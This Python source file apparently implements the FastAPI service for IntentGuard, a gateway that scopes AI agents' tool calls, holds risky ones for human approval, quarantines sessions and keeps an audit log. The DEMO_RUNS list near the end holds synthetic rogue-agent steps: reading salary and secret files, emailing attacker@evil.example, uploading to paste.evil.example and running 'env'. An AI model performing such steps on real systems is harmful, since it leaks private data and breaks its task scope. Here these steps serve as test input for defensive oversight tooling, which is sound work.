"""FastAPI front for the gateway: session control, tool calls, approvals, audit, stats.

Run the demo service (mock tools, synthetic data only):
    uvicorn intentguard.service.app:demo_app --factory --reload
"""

from __future__ import annotations

import json
import os
import secrets
import time
from collections import Counter
from typing import Any

from fastapi import Depends, FastAPI, Header, HTTPException
from fastapi.encoders import jsonable_encoder
from fastapi.middleware.cors import CORSMiddleware
from pydantic import BaseModel, Field

from ..audit import AuditLog
from ..engine import PolicyEngine
from ..gateway import Gateway, GatewayClient, SessionClosed
from ..mock_env import MockEnv
from ..models import Decision
from ..scope import compile_scope

MAX_BODY = 256 * 1024  # bytes; a tool call is small, so anything larger is refused before it is parsed


class NewSession(BaseModel):
    session_id: str = Field(pattern=r"^[A-Za-z0-9._:-]{1,64}$")
    agent_id: str = Field(pattern=r"^[\w .:@-]{1,64}$")
    task: str = Field(min_length=1, max_length=4000)
    grants: dict = Field(default_factory=dict)


class ToolCall(BaseModel):
    tool: str = Field(min_length=1, max_length=128)
    args: dict = Field(default_factory=dict)


class Approver(BaseModel):
    approver: str = Field(min_length=1, max_length=64)


class AdminAction(BaseModel):
    approver: str = Field(min_length=1, max_length=64)
    reason: str = Field(default="", max_length=500)


class _LimitBody:
    """ASGI middleware: refuse a request body over `max_bytes` with 413, by its header or by counting what arrives.
    A framework may swallow an exception raised while reading, so an oversize body is read as empty and the
    application's own reply is replaced by the 413."""

    def __init__(self, app, max_bytes: int = MAX_BODY):
        self.app, self.max = app, max_bytes

    async def __call__(self, scope, receive, send):
        if scope["type"] != "http":
            return await self.app(scope, receive, send)
        length = dict(scope["headers"]).get(b"content-length", b"")
        if length.isdigit() and int(length) > self.max:
            return await self._refuse(send)
        seen = 0
        too_big = False
        replied = False

        async def counted():
            nonlocal seen, too_big
            msg = await receive()
            if msg["type"] == "http.request" and not too_big:
                seen += len(msg.get("body", b""))
                if seen > self.max:
                    too_big = True
            if too_big and msg["type"] == "http.request":
                return {"type": "http.request", "body": b"", "more_body": False}
            return msg

        async def watching(msg):
            nonlocal replied
            if too_big:
                if not replied:
                    replied = True
                    await self._refuse(send)
                return
            await send(msg)

        await self.app(scope, counted, watching)

    @staticmethod
    async def _refuse(send):
        body = b'{"detail":"request body too large"}'
        await send({"type": "http.response.start", "status": 413,
                    "headers": [(b"content-type", b"application/json"), (b"content-length", str(len(body)).encode())]})
        await send({"type": "http.response.body", "body": body})


def _guard(*expected: str | None):
    """Bearer-token check. Any one of the configured tokens is accepted; none configured means open (local demo only).
    The scheme is matched case-insensitively and must be present: a bare token is not accepted."""
    tokens = [t for t in expected if t]

    def dep(authorization: str | None = Header(None)) -> None:
        if not tokens:
            return
        scheme, _, rest = (authorization or "").partition(" ")
        got = rest.strip() if scheme.lower() == "bearer" else ""
        if not any(secrets.compare_digest(got.encode(), t.encode()) for t in tokens):
            raise HTTPException(401, "unauthorized")
    return Depends(dep)


def create_app(gateway: Gateway, agent_token: str | None = None,
               admin_token: str | None = None, default_grants: dict | None = None,
               opener_token: str | None = None) -> FastAPI:
    """agent_token protects /call; admin_token protects everything else. Opening a session (task and grants) needs
    opener_token or admin_token when opener_token is set; when it is not, the agent token opens sessions too, which
    lets whatever holds it choose its own grants, so a real deployment should set it (the process that talks to the
    model should hold only the agent token). default_grants apply to a session opened without grants of its own.
    With any token set the interactive docs and the OpenAPI schema are not served."""
    agent, admin = _guard(agent_token), _guard(admin_token)
    opener = _guard(opener_token, admin_token) if opener_token else agent
    locked = bool(agent_token or admin_token or opener_token)
    app = FastAPI(title="IntentGuard", version="0.1.0", docs_url=None if locked else "/docs",
                  redoc_url=None if locked else "/redoc", openapi_url=None if locked else "/openapi.json")
    app.add_middleware(_LimitBody, max_bytes=MAX_BODY)
    app.add_middleware(CORSMiddleware, allow_origins=["http://localhost:3000"],
                       allow_methods=["*"], allow_headers=["*"])
    clients: dict[str, Any] = {}
    events: list[dict] = []
    by_action: dict[str, dict] = {}

    def do_open(body: NewSession):
        scope = compile_scope(body.task, body.grants or default_grants or {})
        clients[body.session_id] = gateway.open_session(body.session_id, body.agent_id, scope)
        return scope

    def do_call(sid: str, tool: str, args: dict):
        res = clients[sid].call(tool, **args)
        d: Decision = res.decision
        ev = jsonable_encoder({"ts": time.time(), "session": sid,
                               "agent": gateway.sessions[sid].agent_id, "tool": tool,
                               "args": args, "decision": d})
        events.append(ev)
        by_action[d.action_id] = ev
        return res

    app.state.do_open, app.state.do_call = do_open, do_call

    @app.post("/sessions", dependencies=[opener])
    def open_session(body: NewSession):
        if body.session_id in gateway.sessions:
            raise HTTPException(409, "session exists")
        try:
            scope = do_open(body)
        except (KeyError, ValueError) as exc:
            raise HTTPException(422, f"bad grants: {exc}") from exc
        return jsonable_encoder({"session_id": body.session_id, "scope": scope})

    def summarize(sid: str) -> dict:
        s = gateway.sessions[sid]
        mine = [e for e in events if e["session"] == sid]
        quarantine_at = getattr(getattr(gateway.engine, "cfg", None), "quarantine_at", 1.0)
        restricted = [k for k in ("network", "shell") if not getattr(s.caps, k)] +                      [k for k in ("files_locked", "db_needs_review") if getattr(s.caps, k)]
        state = ("closed" if s.closed else "quarantined" if s.risk >= quarantine_at
                 else "restricted" if restricted else "normal")
        return {"session_id": sid, "agent_id": s.agent_id, "task": s.scope.task_text, "state": state,
                "risk": round(s.risk, 3), "restricted": restricted, "taint": s.taint.name,
                "tags": sorted(set(s.tags)), "denied": s.denied, "calls": len(mine),
                "last_ts": mine[-1]["ts"] if mine else None,
                "by_decision": dict(Counter(e["decision"]["decision"] for e in mine))}

    @app.get("/sessions", dependencies=[admin])
    def list_sessions(limit: int = 100):
        """Live view of every session: risk, what has been switched off, and how it has been judged."""
        rows = [summarize(sid) for sid in gateway.sessions]
        rows.sort(key=lambda r: r["last_ts"] or 0, reverse=True)
        return rows[:max(1, min(limit, 500))]

    @app.post("/sessions/{sid}/release", dependencies=[admin])
    def release(sid: str, body: AdminAction):
        """Lift a lock-out after a human has looked at it. Keeps the record of what the session has read."""
        if sid not in gateway.sessions:
            raise HTTPException(404, "no such session")
        return {"released": sid, "before": gateway.release(sid, body.approver, body.reason),
                "session": summarize(sid)}

    @app.post("/sessions/{sid}/close", dependencies=[admin])
    def close(sid: str, body: AdminAction):
        if sid not in gateway.sessions:
            raise HTTPException(404, "no such session")
        gateway.close(sid, body.approver, body.reason)
        return {"closed": sid, "session": summarize(sid)}

    @app.get("/sessions/{sid}", dependencies=[admin])
    def get_session(sid: str):
        s = gateway.sessions.get(sid)
        if not s:
            raise HTTPException(404, "no such session")
        return jsonable_encoder(s)

    @app.post("/sessions/{sid}/call", dependencies=[agent])
    def call(sid: str, body: ToolCall):
        if sid not in clients:
            if sid not in gateway.sessions:
                raise HTTPException(404, "no such session")
            clients[sid] = GatewayClient(gateway, sid)  # a session restored from the store after a restart
        res = do_call(sid, body.tool, body.args)
        return jsonable_encoder({"decision": res.decision, "output": res.output, "error": res.error})

    @app.get("/events", dependencies=[admin])
    def list_events(limit: int = 100):
        return events[-max(1, min(limit, 500)):][::-1]

    @app.get("/pending", dependencies=[admin])
    def pending():
        return [by_action[a] for a in gateway.pending if a in by_action][::-1]

    @app.post("/pending/{action_id}/approve", dependencies=[admin])
    def approve(action_id: str, body: Approver):
        if action_id not in gateway.pending:
            raise HTTPException(404, "not pending")
        try:
            return jsonable_encoder({"output": gateway.approve(action_id, body.approver)})
        except SessionClosed as exc:
            raise HTTPException(409, str(exc)) from exc

    @app.post("/pending/{action_id}/reject", dependencies=[admin])
    def reject(action_id: str, body: Approver):
        if action_id not in gateway.pending:
            raise HTTPException(404, "not pending")
        gateway.reject(action_id, body.approver)
        return {"rejected": action_id}

    @app.get("/audit", dependencies=[admin])
    def audit(offset: int = 0, limit: int = 100):
        limit, offset = max(1, min(limit, 500)), max(0, offset)
        rows = gateway.audit.entries[offset:offset + limit]
        return {"total": len(gateway.audit.entries),
                "entries": [{**e, "payload": json.loads(e["payload"])} for e in rows]}

    @app.get("/audit/verify", dependencies=[admin])
    def verify():
        ok, bad = gateway.audit.verify()
        return {"ok": ok, "first_bad_seq": bad}

    @app.get("/stats", dependencies=[admin])
    def stats():
        acts = [json.loads(e["payload"]) for e in gateway.audit.entries]
        acts = [a for a in acts if a.get("event") == "action"]
        c = Counter(a["decision"] for a in acts)
        return {"inspected": len(acts), "by_decision": dict(c),
                "pending": len(gateway.pending), "sessions": len(gateway.sessions)}

    return app


DEMO_GRANTS = {"resources": ["research/*"], "project_root": "research/",
               "max_classification": "INTERNAL", "destinations": ["advisor@university.edu"]}
DEMO_BROAD = {"resources": ["*"], "project_root": "research/", "max_classification": "SECRET",
              "destinations": ["advisor@university.edu"]}
DEMO_RUNS = [
    ("Research Agent", "Read my research folder and summarize the documents", DEMO_GRANTS, [
        ("read_file", {"path": "research/paper.pdf"}), ("read_file", {"path": "hr/salary.xlsx"}),
        ("send_email", {"to": "attacker@evil.example", "body": "fwd", "attachment": "research/paper.pdf"}),
        ("upload", {"url": "paste.evil.example", "data": "doc"})]),
    ("Browser Agent", "Summarize notes and email my advisor", DEMO_GRANTS, [
        ("read_file", {"path": "research/notes.md"}),
        ("send_email", {"to": "advisor@university.edu", "body": "Summary attached."}),
        ("send_email", {"to": "friend@other.org", "body": "fyi"})]),
    ("Ops Agent", "Read the research documents and email a summary to my advisor", DEMO_BROAD, [
        ("read_file", {"path": "research/paper.pdf"}), ("search_files", {"query": "api key"}),
        ("read_file", {"path": "secrets/app.env"}),
        ("upload", {"url": "paste.evil.example", "data": "collected"}),
        ("run_shell", {"cmd": "env"})]),
]


def add_demo_seed(app: FastAPI, admin_token: str | None) -> None:
    """Add POST /demo/seed, which replays synthetic scenarios so the dashboard has data. Demo service only."""
    n = {"i": 0}

    @app.post("/demo/seed", dependencies=[_guard(admin_token)])
    def seed():
        n["i"] += 1
        for agent, task, grants, steps in DEMO_RUNS:
            sid = f"demo{n['i']}-{agent.split()[0].lower()}"
            app.state.do_open(NewSession(session_id=sid, agent_id=agent, task=task, grants=grants))
            for tool, args in steps:
                app.state.do_call(sid, tool, args)
        return {"seeded": len(DEMO_RUNS)}


def demo_app() -> FastAPI:
    env = MockEnv()
    audit_file = os.environ.get("INTENTGUARD_AUDIT_FILE")  # persists the hash chain across restarts
    admin_token = os.environ.get("INTENTGUARD_ADMIN_TOKEN")
    app = create_app(Gateway(env.tools(), env.catalog(), PolicyEngine(), AuditLog(audit_file)),
                     os.environ.get("INTENTGUARD_AGENT_TOKEN"), admin_token,
                     opener_token=os.environ.get("INTENTGUARD_OPENER_TOKEN"))
    add_demo_seed(app, admin_token)
    return app
